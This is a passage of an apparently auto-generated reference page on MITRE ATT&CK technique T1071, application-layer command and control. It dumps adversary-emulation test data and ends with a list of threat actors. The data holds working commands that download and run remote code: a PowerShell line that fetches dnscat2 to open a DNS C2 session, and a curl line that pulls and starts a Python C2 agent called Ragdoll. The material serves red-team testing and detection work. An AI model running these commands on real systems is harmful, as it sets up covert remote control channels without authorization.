                                                                                                                                    'prepended '
                                                                                                                                    'to '
                                                                                                                                    'the '
                                                                                                                                    'domain '
                                                                                                                                    'name '
                                                                                                                                    '(should '
                                                                                                                                    'be '
                                                                                                                                    '63 '
                                                                                                                                    'characters '
                                                                                                                                    'to '
                                                                                                                                    'test '
                                                                                                                                    'maximum '
                                                                                                                                    'length)',
                                                                                                                     'type': 'string'}},
                                                                                   'name': 'DNS '
                                                                                           'Long '
                                                                                           'Domain '
                                                                                           'Query',
                                                                                   'supported_platforms': ['windows']},
                                                                                  {'auto_generated_guid': 'e7bf9802-2e78-4db9-93b5-181b7bcd37d7',
                                                                                   'description': 'This '
                                                                                                  'will '
                                                                                                  'attempt '
                                                                                                  'to '
                                                                                                  'start '
                                                                                                  'a '
                                                                                                  'C2 '
                                                                                                  'session '
                                                                                                  'using '
                                                                                                  'the '
                                                                                                  'DNS '
                                                                                                  'protocol. '
                                                                                                  'You '
                                                                                                  'will '
                                                                                                  'need '
                                                                                                  'to '
                                                                                                  'have '
                                                                                                  'a '
                                                                                                  'listener '
                                                                                                  'set '
                                                                                                  'up '
                                                                                                  'and '
                                                                                                  'create '
                                                                                                  'DNS '
                                                                                                  'records '
                                                                                                  'prior '
                                                                                                  'to '
                                                                                                  'executing '
                                                                                                  'this '
                                                                                                  'command.\n'
                                                                                                  'The '
                                                                                                  'following '
                                                                                                  'blogs '
                                                                                                  'have '
                                                                                                  'more '
                                                                                                  'information.\n'
                                                                                                  '\n'
                                                                                                  'https://github.com/iagox86/dnscat2\n'
                                                                                                  '\n'
                                                                                                  'https://github.com/lukebaggett/dnscat2-powershell\n',
                                                                                   'executor': {'command': 'IEX '
                                                                                                           '(New-Object '
                                                                                                           "System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\n"
                                                                                                           'Start-Dnscat2 '
                                                                                                           '-Domain '
                                                                                                           '#{domain} '
                                                                                                           '-DNSServer '
                                                                                                           '#{server_ip}\n',
                                                                                                'elevation_required': False,
                                                                                                'name': 'powershell'},
                                                                                   'input_arguments': {'domain': {'default': 'example.com',
                                                                                                                  'description': 'Domain '
                                                                                                                                 'Name '
                                                                                                                                 'configured '
                                                                                                                                 'to '
                                                                                                                                 'use '
                                                                                                                                 'DNS '
                                                                                                                                 'Server '
                                                                                                                                 'where '
                                                                                                                                 'your '
                                                                                                                                 'C2 '
                                                                                                                                 'listener '
                                                                                                                                 'is '
                                                                                                                                 'running',
                                                                                                                  'type': 'string'},
                                                                                                       'server_ip': {'default': '127.0.0.1',
                                                                                                                     'description': 'IP '
                                                                                                                                    'address '
                                                                                                                                    'of '
                                                                                                                                    'DNS '
                                                                                                                                    'server '
                                                                                                                                    'where '
                                                                                                                                    'your '
                                                                                                                                    'C2 '
                                                                                                                                    'listener '
                                                                                                                                    'is '
                                                                                                                                    'running',
                                                                                                                     'type': 'string'}},
                                                                                   'name': 'DNS '
                                                                                           'C2',
                                                                                   'supported_platforms': ['windows']}],
                                                                 'attack_technique': 'T1071',
                                                                 'display_name': 'Standard '
                                                                                 'Application '
                                                                                 'Layer '
                                                                                 'Protocol'}},
 {'Mitre Stockpile - A Python agent which communicates via the HTML contact': {'description': 'A '
                                                                                              'Python '
                                                                                              'agent '
                                                                                              'which '
                                                                                              'communicates '
                                                                                              'via '
                                                                                              'the '
                                                                                              'HTML '
                                                                                              'contact',
                                                                               'id': '0ab383be-b819-41bf-91b9-1bd4404d83bf',
                                                                               'name': 'Ragdoll',
                                                                               'platforms': {'darwin': {'sh': {'cleanup': 'pkill '
                                                                                                                          '-f '
                                                                                                                          'ragdoll\n',
                                                                                                               'command': 'server="#{app.contact.http}";\n'
                                                                                                                          'curl '
                                                                                                                          '-s '
                                                                                                                          '-X '
                                                                                                                          'POST '
                                                                                                                          '-H '
                                                                                                                          '"file:ragdoll.py" '
                                                                                                                          '-H '
                                                                                                                          '"platform:darwin" '
                                                                                                                          '$server/file/download '
                                                                                                                          '> '
                                                                                                                          'ragdoll.py;\n'
                                                                                                                          'pip '
                                                                                                                          'install '
                                                                                                                          'requests '
                                                                                                                          'beautifulsoup4;\n'
                                                                                                                          'python '
                                                                                                                          'ragdoll.py '
                                                                                                                          '-W '
                                                                                                                          '$server#{app.contact.html}\n'}},
                                                                                             'linux': {'sh': {'cleanup': 'pkill '
                                                                                                                         '-f '
                                                                                                                         'ragdoll\n',
                                                                                                              'command': 'server="#{app.contact.http}";\n'
                                                                                                                         'curl '
                                                                                                                         '-s '
                                                                                                                         '-X '
                                                                                                                         'POST '
                                                                                                                         '-H '
                                                                                                                         '"file:ragdoll.py" '
                                                                                                                         '-H '
                                                                                                                         '"platform:linux" '
                                                                                                                         '$server/file/download '
                                                                                                                         '> '
                                                                                                                         'ragdoll.py;\n'
                                                                                                                         'pip '
                                                                                                                         'install '
                                                                                                                         'requests '
                                                                                                                         'beautifulsoup4;\n'
                                                                                                                         'python '
                                                                                                                         'ragdoll.py '
                                                                                                                         '-W '
                                                                                                                         '$server#{app.contact.html}\n'}}},
                                                                               'tactic': 'command-and-control',
                                                                               'technique': {'attack_id': 'T1071',
                                                                                             'name': 'Standard '
                                                                                                     'Application '
                                                                                                     'Layer '
                                                                                                     'Protocol'}}}]
```

# Tactics


* [Command and Control](../tactics/Command-and-Control.md)


# Mitigations

None

# Actors


* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)

* [APT19](../actors/APT19.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)
    
* [FIN7](../actors/FIN7.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [APT38](../actors/APT38.md)
    
* [SilverTerrier](../actors/SilverTerrier.md)
    
* [APT18](../actors/APT18.md)
    
* [Stealth Falcon](../actors/Stealth-Falcon.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [Rancor](../actors/Rancor.md)
    
* [Gamaredon Group](../actors/Gamaredon-Group.md)
    
* [APT28](../actors/APT28.md)
    
* [APT37](../actors/APT37.md)
    
* [APT32](../actors/APT32.md)
    
* [OilRig](../actors/OilRig.md)
    
* [Orangeworm](../actors/Orangeworm.md)
    
* [Turla](../actors/Turla.md)
    
* [FIN6](../actors/FIN6.md)
    
* [Night Dragon](../actors/Night-Dragon.md)
    
* [FIN4](../actors/FIN4.md)
    
* [Ke3chang](../actors/Ke3chang.md)
    
* [Dark Caracal](../actors/Dark-Caracal.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
* [Honeybee](../actors/Honeybee.md)
    
* [APT33](../actors/APT33.md)
    
* [WIRTE](../actors/WIRTE.md)
    
* [Machete](../actors/Machete.md)
    
* [APT41](../actors/APT41.md)
    
